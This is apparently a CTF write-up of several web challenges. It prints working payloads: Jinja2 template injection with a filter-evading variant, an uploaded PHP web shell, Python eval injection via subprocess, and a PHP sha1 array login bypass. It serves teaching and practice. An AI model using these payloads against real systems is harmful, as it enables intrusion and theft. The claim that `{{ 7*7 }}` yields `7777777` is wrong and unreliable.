# WEB

## SSTI1

From the challenge title, it's clear we're dealing with **Server-Side Template Injection (SSTI)**. I tested various payloads to identify the template engine.

### Identifying the Template Engine

The payload `{{ 7*7 }}` returned `7777777`, confirming the engine is **Jinja2**.

### Exploitation

To confirm command execution:

```jinja
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```

Then I used:

```jinja
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

And successfully retrieved the flag.

## SSTI2

The vulnerability was confirmed using:

```jinja
{{ 7 * '7' }}
```

Which returned `7777777`.

### Bypassing Filters

This obfuscated payload bypasses filters and executes code:

```jinja
{{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('id') | attr('read')() }}
```

To read the flag:

```jinja
{{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('cat flag') | attr('read')() }}
```

## n0s4n1ty 1

This challenge allowed uploading `.php` files disguised as images. I injected a PHP reverse shell into the file.

Uploaded to `/uploads/index.php`, then triggered command execution with:

```
/uploads/index.php?cmd=sudo cat /root/flag.txt
```

## HEAD-DUMP

The app includes an API GUI in one article. Among the documented endpoints, `/headdump` dumps memory contents.

I downloaded the dump and ran:

```bash
grep -E "picoCTF{.*}" heapdump-*.heapsnapshot
```

Which revealed the flag.

## Cookie Monster Secret Recipe

After attempting login with `admin:password`, I noticed a cookie named `secret_recipe`.

The cookie is base64-encoded. I decoded it using CyberChef to get the secret.

## 3vl1

This challenge is a calculator using `eval()` to process inputs. From the HTML source:

![Source Code](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*K1HYLTpExgKko7Apz3SRGw.png)

1. Dynamically import subprocess:

   ```python
   __import__('subprocess')
   ```

2. Use `getattr()` to avoid detection:

   ```python
   getattr(__import__('subprocess'), 'check_output')
   ```

3. Obfuscate command with `chr()`:

   ```python
   chr(99)+chr(97)+chr(116)  # "cat"
   chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)  # "/flag.txt"
   ```

4. Final payload:

   ```python
   getattr(__import__('subprocess'), 'check_output')(['cat', '/flag.txt'])
   ```

Executed through the input field to read the flag.

## Aprite Sesamo

We're blocked from logging in. But devs left clues suggesting backup file extensions like `.old`, `.backup`, `~`.

We exploit PHP’s weak typing and `sha1()` behavior with arrays. Send POST data as arrays:

```
username[]=123&pwd[]=456
```

This makes:

```php
$yuf85e0677 = $_POST['username']; // Array
$rs35c246d5 = $_POST['pwd'];     // Array
```

Then `sha1(array)` returns `null`. So:

```php
sha1($yuf85e0677) === sha1($rs35c246d5)
```

Evaluates to `null === null`, which is `true`.

Login bypassed.
